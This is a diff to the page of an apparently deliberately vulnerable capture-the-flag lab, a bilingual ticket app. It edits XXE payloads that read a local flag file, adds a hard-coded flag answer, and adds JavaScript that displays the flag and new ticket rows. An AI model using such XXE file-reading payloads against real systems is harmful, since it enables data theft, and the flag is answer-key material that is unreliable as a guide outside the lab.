@@ -84,7 +84,7 @@
             <th class="pb-2 font-medium">Estado</th>
           </tr>
         </thead>
-        <tbody class="text-gray-600 dark:text-gray-400">
+        <tbody id="recentTicketsBody" class="text-gray-600 dark:text-gray-400">
           <tr class="border-b border-gray-100 dark:border-gray-800"><td class="py-1.5 pr-3 font-mono">TK-83421</td><td class="pr-3">María López</td><td class="pr-3">Soporte Técnico</td><td><span class="text-green-500">✓ Resuelto</span></td></tr>
           <tr class="border-b border-gray-100 dark:border-gray-800"><td class="py-1.5 pr-3 font-mono">TK-83419</td><td class="pr-3">Carlos Ruiz</td><td class="pr-3">Seguridad IT</td><td><span class="text-yellow-500">⏳ Pendiente</span></td></tr>
           <tr><td class="py-1.5 pr-3 font-mono">TK-83415</td><td class="pr-3">Ana Martín</td><td class="pr-3">Administración</td><td><span class="text-green-500">✓ Resuelto</span></td></tr>
@@ -120,10 +120,10 @@
   &lt;message&gt;test&lt;/message&gt;
 &lt;/ticket&gt;</pre>
 
-    <h4>Leer la flag secreta</h4>
+    <h4>Leer la flag dedicada</h4>
     <pre>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
 &lt;!DOCTYPE ticket [
-  &lt;!ENTITY xxe SYSTEM "file:///app/secret/flag.txt"&gt;
+  &lt;!ENTITY xxe SYSTEM "file:///app/secret/xxe-flag.txt"&gt;
 ]&gt;
 &lt;ticket&gt;
   &lt;name&gt;&amp;xxe;&lt;/name&gt;
@@ -131,6 +131,7 @@
   &lt;subject&gt;test&lt;/subject&gt;
   &lt;message&gt;test&lt;/message&gt;
 &lt;/ticket&gt;</pre>
+    <p>Flag dedicada XXE (leet): <code>HL{xx3_xm1_3n717y_0wn3d}</code>.</p>
 
     <h4>SSRF – Acceder a servicios internos</h4>
     <pre>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
@@ -224,10 +225,10 @@ curl -X POST http://TARGET_IP/xxe/api \
   &lt;message&gt;test&lt;/message&gt;
 &lt;/ticket&gt;</pre>
 
-    <h4>Read the secret flag</h4>
+    <h4>Read the dedicated flag</h4>
     <pre>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
 &lt;!DOCTYPE ticket [
-  &lt;!ENTITY xxe SYSTEM "file:///app/secret/flag.txt"&gt;
+  &lt;!ENTITY xxe SYSTEM "file:///app/secret/xxe-flag.txt"&gt;
 ]&gt;
 &lt;ticket&gt;
   &lt;name&gt;&amp;xxe;&lt;/name&gt;
@@ -235,6 +236,7 @@ curl -X POST http://TARGET_IP/xxe/api \
   &lt;subject&gt;test&lt;/subject&gt;
   &lt;message&gt;test&lt;/message&gt;
 &lt;/ticket&gt;</pre>
+    <p>Dedicated XXE flag (leet): <code>HL{xx3_xm1_3n717y_0wn3d}</code>.</p>
 
     <h4>SSRF – Access internal services</h4>
     <pre>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
@@ -344,6 +346,22 @@ document.getElementById('ticketForm').addEventListener('submit', function(e) {
       document.getElementById('resEmail').textContent   = data.ticket.email;
       document.getElementById('resSubject').textContent = data.ticket.subject;
       document.getElementById('resMessage').textContent = data.ticket.message;
+      if (data.flag) {
+        document.getElementById('resMessage').textContent += `\n\nFLAG: ${data.flag}`;
+      }
+
+      const tbody = document.getElementById('recentTicketsBody');
+      if (tbody) {
+        const row = document.createElement('tr');
+        row.className = 'border-b border-gray-100 dark:border-gray-800';
+        row.innerHTML = `
+          <td class="py-1.5 pr-3 font-mono">${data.ticket.id}</td>
+          <td class="pr-3">${(data.ticket.name || '').replace(/</g,'&lt;').replace(/>/g,'&gt;')}</td>
+          <td class="pr-3">${(data.ticket.subject || '').replace(/</g,'&lt;').replace(/>/g,'&gt;')}</td>
+          <td><span class="text-yellow-500">⏳ Pendiente</span></td>
+        `;
+        tbody.prepend(row);
+      }
     } else {
       resultDiv.classList.add('hidden');
       errorDiv.classList.remove('hidden');
